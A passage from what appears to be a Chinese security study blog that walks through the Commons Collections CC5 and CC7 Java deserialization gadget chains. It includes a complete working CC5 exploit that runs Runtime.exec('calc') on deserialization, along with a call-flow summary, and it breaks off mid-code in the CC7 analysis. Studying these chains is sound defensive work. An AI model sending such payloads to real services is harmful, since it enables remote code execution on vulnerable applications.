+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InvocationHandler</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">h</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (InvocationHandler) </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Target</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, lazyMap);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">mapProxy</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (Map) </span><span style="color: #E5C07B">Proxy</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newProxyInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClassLoader</span><span style="color: #ABB2BF">(), </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, h);</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">o</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Override</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, mapProxy);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(o);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li>
+</ul>
+<p>&#x2F;&#x2F;主要是这里不同</p>
+<ul>
+<li><p>到<code>lazymap</code>是一样的</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC5Test</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchFieldException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InstantiationException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">transformers</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">},</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">},</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">},</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">})</span></span>
+<span class="line"><span style="color: #ABB2BF">        };</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">chainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #ABB2BF">(transformers);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HashMap</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">lazymap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, chainedTransformer);</span></span></code></pre></div></div></figure>
+</li>
+<li><p>后面<code>TiedMapEntry.toString.getValue.get—-&gt;LazyMap.get</code></p>
+<ul>
+<li>先看TiedMapEntry构造器</li>
+</ul>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TiedMapEntry</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> map</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> key) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">super</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">map</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> map</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">key</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<ul>
+<li>传两个参数，使用toString()</li>
+</ul>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">TiedMapEntry</span><span style="color: #E06C75"> tiedMapEntry </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TiedMapEntry</span><span style="color: #E06C75">(lazymap</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;key&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E5C07B">tiedMapEntry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure>
+</li>
+<li><p>调用BadAttributeValueExpException.readObject</p>
+<ul>
+<li><p>依旧看看readObject的代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204195317499.png" srcset="/img/loading.gif" lazyload alt="image-20250506221407897"></p>
+<p>触发val &#x3D; valObj.toString();————–由val 控制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204195919153.png" srcset="/img/loading.gif" lazyload alt="image-20251204195919111"></p>
+<p>所以说，反射修改val为tiedMapEntry即可触发恶意代码</p>
+</li>
+<li><p>编写</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">BadAttributeValueExpException</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> c4 </span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">BadAttributeValueExpException</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E5C07B">BadAttributeValueExpException</span><span style="color: #E06C75"> bad </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c4</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> val </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c4</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;val&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">val</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E5C07B">val</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(bad,tiedMapEntry);</span></span></code></pre></div></div></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="shiki jaVA"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div><div class="code"><pre><code>public class CC5Test {
+    public static void main(String[] args) throws NoSuchFieldException, InstantiationException, IllegalAccessException, IOException, ClassNotFoundException {
+        Transformer[] transformers={
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap map = new HashMap();
+        Map lazymap = LazyMap.decorate(map, chainedTransformer);
+        // lazymap.get(1);
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"key");
+        tiedMapEntry.toString();
+
+        Class<BadAttributeValueExpException> c4 =BadAttributeValueExpException.class;
+        BadAttributeValueExpException bad = c4.newInstance();
+        Field val = c4.getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(bad,tiedMapEntry);//BadAttributeValueExpException它可序列化
+
+
+
+        serialize(bad);
+        unserialize("ser.bin");
+
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+}</code></pre></div></div></figure>
+
+<h2 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h2><figure class="shiki scss"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">readObject()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">valObj = tiedMapEntry  ←我们塞进去的</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">val = valObj.toString()  ←自动执行</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">TiedMapEntry.toString()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">LazyMap.get()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">ChainedTransformer.transform()</span></span>
+<span class="line"><span style="color: #ABB2BF">↓</span></span>
+<span class="line"><span style="color: #ABB2BF">Runtime.exec(&quot;calc&quot;)</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204200153551.png" srcset="/img/loading.gif" lazyload alt="image-20251204200153514"></p>
+<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><blockquote>
+<p>和cc1类似就是lazymap.get的触发变了</p>
+<p>把cc1的Proxy(annotationinvocationHandler).xxx——————————————LazyMap.get</p>
+<p>变成了Hashtable.readObject—-AbstractMap.equals—LazyMap.get</p>
+</blockquote>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204200902652.png" srcset="/img/loading.gif" lazyload alt="image-20251204200902598"></p>
+<ul>
+<li><p>还是找<code>get</code>调用</p>
+<p>因为 LazyMap 不存在 equals 方法，然后找到它的父类 AbstractMapDecorator 调用 equals</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">equals</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> object) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (object </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(object);</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p><code>AbstractMap</code>类的<code>equals</code>方法</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">equals</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> o) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (o </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #E06C75">)</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">(o </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> Map))</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> m </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Map</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75">) o</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">m</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">size</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">size</span><span style="color: #E06C75">())</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Iterator</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Entry</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">K</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">V</span><span style="color: #ABB2BF">&gt;&gt;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">entrySet</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">iterator</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">while</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">i</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hasNext</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Entry</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">K</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">V</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> e </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">i</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">K</span><span style="color: #E06C75"> key </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getKey</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">V</span><span style="color: #E06C75"> value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getValue</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (value </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">m</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(key)</span><span style="color: #56B6C2">==</span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">m</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">containsKey</span><span style="color: #ABB2BF">(key)</span><span style="color: #E06C75">))</span></span>
+<span class="line"><span style="color: #E06C75">                    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">value</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">m</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(key))</span><span style="color: #E06C75">)</span></span>
+<span class="line"><span style="color: #E06C75">                    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">            }</span></span>
+<span class="line"><span style="color: #E06C75">        }</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">ClassCastException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">unused</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">NullPointerException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">unused</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p>这个类中调用<code>equals</code></p>
+</li>
+<li><p>找<code>equals</code>的调用</p>
+<p>找到<code>Hashtable</code>类的<code>reconstitutionPut</code>方法</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">reconstitutionPut</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Entry</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75">[] tab</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> 